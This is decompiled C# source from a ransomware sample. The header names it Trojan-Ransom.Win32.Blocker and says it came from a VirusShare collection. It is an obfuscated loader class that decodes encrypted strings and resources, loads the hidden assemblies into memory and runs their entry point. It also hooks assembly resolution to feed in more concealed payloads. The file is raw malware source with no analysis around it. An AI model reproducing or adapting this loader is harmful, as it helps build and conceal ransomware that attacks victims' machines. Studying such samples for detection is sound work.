// Decompiled with JetBrains decompiler
// Type: .
// Assembly: 1m, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9A9758D8-D673-4760-AFDD-69A3D20C59FF
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.krdt-d2cd288694c5883ae6364f17a60ae3fe9619748d94946bbd3e1ff8ba566b1e0f.exe

using \u0001;
using \u000E;
using \u0010;
using \u0020;
using SmartAssembly.MemoryManagement;
using System;
using System.Collections.Specialized;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;

namespace \u0001
{
  internal class \u000E
  {
    private static readonly string \u0001;
    private static readonly string \u0001;
    private static readonly string \u0002;
    private static HybridDictionary \u0001;
    private static ResourceManager \u0001;
    private static \u0011 \u0001;
    private static bool \u0001;
    [NonSerialized]
    internal static \u0013 \u0008;

    static \u000E()
    {
      \u0003.\u0001(typeof (\u0001.\u000E));
      \u0001.\u000E.\u0001 = \u0005.\u0001(505614325, 316092229, 1843956081);
      \u0001.\u000E.\u0001 = \u0005.\u0001(1453936040, 316092235, 1843956087);
      \u0001.\u000E.\u0002 = \u0005.\u0001(655525482, 316092253, 1843956083);
      \u0001.\u000E.\u0001 = (HybridDictionary) null;
      \u0001.\u000E.\u0001 = (ResourceManager) null;
      \u0001.\u000E.\u0001 = new \u0011();
      \u0001.\u000E.\u0001 = false;
    }

    [SpecialName]
    private static bool \u0001() => bool.Parse(\u0005.\u0001(1965985352, 316091867, 1843956083));

    private static bool \u0001(string[] _param0)
    {
      if (\u0005.\u0001(1002814152, 316091795, 1843956083).ToLower() == \u0005.\u0001(1655417648, 316091803, 1843956081) && _param0 != null && _param0.Length > 0)
      {
        string str1 = \u0005.\u0001(385290983, 316091803, 1843956089);
        string str2 = \u0005.\u0001(1621179600, 316091803, 1843956089);
        bool flag = bool.Parse(\u0005.\u0001(1352943189, 316091885, 1843956083));
        string str3 = \u0005.\u0001(943740762, 316091885, 1843956089);
        \u002F.\u0023 obj = bool.Parse(\u0005.\u0001(500558362, 316091893, 1843956081)) ? \u002F.\u0023.\u0001 : \u002F.\u0023.\u0001;
        if (_param0[0] == \u0005.\u0001(993556606, 316091845, 1843956073))
        {
          if (\u002F.\u0001(Assembly.GetEntryAssembly().Location, str1, str2, flag, true, str3, obj))
            return \u0001.\u000E.\u0001();
          Environment.Exit(5);
        }
        if (_param0[0] == \u0005.\u0001(742305262, 316091857, 1843956077))
        {
          if (\u002F.\u0001(str1, true))
            return \u0001.\u000E.\u0001();
          Environment.Exit(5);
        }
      }
      return true;
    }

    [STAThread]
    private static void \u0001(string[] _param0)
    {
      MemoryManager.\u0001();
      if (!\u0001.\u000E.\u0001(_param0) || new \u0020.\u000E().\u0020(DateTime.Now.Millisecond) != \u0005.\u0001(1833457602, 316091785, 1843956093))
        return;
      AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u0001.\u000E.\u0001);
      \u0001.\u000E.\u0002(_param0);
    }

    private static void \u0002(string[] _param0) => \u0001.\u000E.\u0001((Assembly) \u0001.\u000E.\u0001(\u0001.\u000E.\u0001(\u0005.\u0001(771150195, 316091725, 1843956025)) ?? throw new Exception(\u0005.\u0001(989591619, 316091789, 1843956025))), _param0);

    private static object \u0001(byte[] _param0)
    {
      try
      {
        return new \u0020.\u000E().\u0020(DateTime.Now.Millisecond) != \u0005.\u0001(1795991020, 316091661, 1843956093) ? (object) null : (object) Assembly.Load(_param0);
      }
      catch (Exception ex)
      {
        return (object) null;
      }
    }

    private static Assembly \u0001()
    {
      try
      {
        byte[] buffer = \u0001.\u000E.\u0001(\u0005.\u0001(1650661672, 316091649, 1843956067));
        return buffer == null ? (Assembly) null : Assembly.Load(new MemoryStream(buffer).ToArray());
      }
      catch
      {
        return (Assembly) null;
      }
    }

    private static void \u0001(Assembly _param0, string[] _param1)
    {
      MethodInfo entryPoint = _param0.EntryPoint;
      ParameterInfo[] parameters1 = entryPoint.GetParameters();
      object[] parameters2 = (object[]) null;
      if (parameters1 != null && parameters1.Length > 0)
        parameters2 = new object[1]{ (object) _param1 };
      entryPoint.Invoke((object) null, parameters2);
    }

    [Obfuscation(Exclude = true, Feature = "cw method body protection", StripAfterObfuscation = false)]
    private static Assembly \u0001(object _param0, ResolveEventArgs _param1) => \u0001.\u000E.\u0001(_param1);

    private static Assembly \u0001(ResolveEventArgs _param0) => \u0001.\u000E.\u0001 ? (Assembly) null : (Assembly) \u0001.\u000E.\u0003(_param0.Name);

    [SpecialName]
    public static string \u0002() => Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);

    private static byte[] \u0001(string _param0)
    {
      if (\u0001.\u000E.\u0001 == null)
        \u0001.\u000E.\u0001 = new ResourceManager(\u0005.\u0001(2136364593, 316091395, 1843956025), typeof (\u0001.\u000E).Assembly);
      try
      {
        \u0001.\u000E.\u0001 = true;
        string str = \u0001.\u000E.\u0001(_param0);
        return \u0020.\u000E.\u0001((byte[]) \u0001.\u000E.\u0001.GetObject(\u0020.\u000E.\u0001(str)), \u0005.\u0001(1581677343, 316091581, 1843955979), \u0005.\u0001(750560264, 316091695, 1843955979));
      }
      finally
      {
        \u0001.\u000E.\u0001 = false;
      }
    }

    private static string \u0001(string _param0) => _param0.Replace(\u0005.\u0001(1171891809, 316092351, 1843956091), \u0005.\u0001(677737018, 316092347, 1843956093)).Replace(\u0005.\u0001(1075945914, 316092293, 1843956091), \u0005.\u0001(494347718, 316092289, 1843956093)).Replace(\u0005.\u0001(237011422, 316092317, 1843956077), \u0005.\u0001(1053297415, 316092313, 1843956093)).Replace(\u0005.\u0001(1801380963, 316092405, 1843956077), \u0005.\u0001(1017705367, 316092401, 1843956093)).Replace(\u0005.\u0001(1013786841, 316092359, 1843956087), \u0005.\u0001(945940111, 316092355, 1843956093));

    private static byte[] \u0001(StringDictionary _param0)
    {
      string path2_1 = _param0[\u0001.\u000E.\u0001];
      string path2_2 = _param0[\u0001.\u000E.\u0001];
      bool flag = path2_1.ToLower().Equals(\u0005.\u0001(590671982, 316092349, 1843956087));
      AppDomain currentDomain = AppDomain.CurrentDomain;
      StringCollection stringCollection1 = new StringCollection();
      string path1 = currentDomain.SetupInformation.ApplicationBase;
      if (!flag)
        path1 = Path.Combine(path1, path2_1);
      stringCollection1.Add(path1);
      stringCollection1.Add(Path.Combine(path1, path2_2));
      byte[] numArray = \u0001.\u000E.\u0001(stringCollection1, path2_2);
      if (numArray != null)
        return numArray;
      StringCollection stringCollection2 = new StringCollection();
      string privateBinPath = currentDomain.SetupInformation.PrivateBinPath;
      if (privateBinPath == null || privateBinPath.Trim().Length <= 0)
        return (byte[]) null;
      string str1 = privateBinPath;
      char[] chArray1 = new char[1]{ Path.PathSeparator };
      foreach (string str2 in str1.Split(chArray1))
      {
        char[] chArray2 = new char[3]
        {
          ' ',
          '\t',
          Path.PathSeparator
        };
        string str3 = str2.Trim(chArray2);
        if (!Path.IsPathRooted(str3))
          str3 = Path.Combine(currentDomain.SetupInformation.ApplicationBase, str3);
        if (!flag)
          str3 = Path.Combine(str3, path2_1);
        stringCollection2.Add(str3);
        stringCollection2.Add(Path.Combine(str3, path2_2));
      }
      return \u0001.\u000E.\u0001(stringCollection2, path2_2);
    }

    private static byte[] \u0001(StringCollection _param0, string _param1)
    {
      for (int index = 0; index < _param0.Count; ++index)
      {
        string path = Path.Combine(_param0[index], _param1 + \u0001.\u000E.\u0002);
        if (File.Exists(path))
          return \u0001.\u000E.\u0002(path);
      }
      return (byte[]) null;
    }

    private static byte[] \u0002(string _param0)
    {
      FileStream fileStream = (FileStream) null;
      byte[] buffer = (byte[]) null;
      try
      {
        fileStream = File.OpenRead(_param0);
        buffer = new byte[fileStream.Length];
        fileStream.Read(buffer, 0, buffer.Length);
        fileStream.Flush();
      }
      finally
      {
        fileStream?.Close();
      }
      return buffer;
    }

    private static object \u0003(string _param0)
    {
      if (_param0 == null)
        return (object) null;
      if (\u0001.\u000E.\u0001 == null)
        \u0001.\u000E.\u0001 = new HybridDictionary();
      _param0 = _param0.Trim();
      string lower = _param0.ToLower();
      if (\u0001.\u000E.\u0001[(object) lower] != null)
        return (object) (Assembly) \u0001.\u000E.\u0001[(object) lower];
      StringDictionary stringDictionary = \u0001.\u000E.\u0004(_param0);
      string str = stringDictionary[\u0001.\u000E.\u0001];
      byte[] numArray1 = (byte[]) null;
      if (str.ToLower().Equals(\u0005.\u0001(861621330, 316092335, 1843956075)))
      {
        Assembly assembly = \u0001.\u000E.\u0001();
        \u0001.\u000E.\u0001[(object) lower] = (object) assembly;
        return (object) assembly;
      }
      byte[] numArray2 = \u0001.\u000E.\u0001(_param0) ?? \u0001.\u000E.\u0001(str);
      if (numArray2 == null)
      {
        try
        {
          numArray2 = \u0001.\u000E.\u0001(stringDictionary);
        }
        catch
        {
          numArray2 = (byte[]) null;
        }
      }
      if (numArray2 == null)
        return (object) null;
      object obj = \u0001.\u000E.\u0001(numArray2);
      numArray1 = (byte[]) null;
      \u0001.\u000E.\u0001[(object) lower] = obj;
      return obj;
    }

    private static StringDictionary \u0004(string _param0)
    {
      StringDictionary stringDictionary = new StringDictionary();
      string str1 = _param0;
      char[] chArray1 = new char[1]{ ',' };
      foreach (string str2 in str1.Split(chArray1))
      {
        char[] chArray2 = new char[2]{ ' ', ',' };
        string[] strArray = str2.Trim(chArray2).Split('=');
        if (strArray.Length < 2)
          stringDictionary.Add(\u0001.\u000E.\u0001, strArray[0]);
        else
          stringDictionary.Add(strArray[0].Trim(' ', '='), strArray[1].Trim(' ', '='));
      }
      return stringDictionary;
    }
  }
}
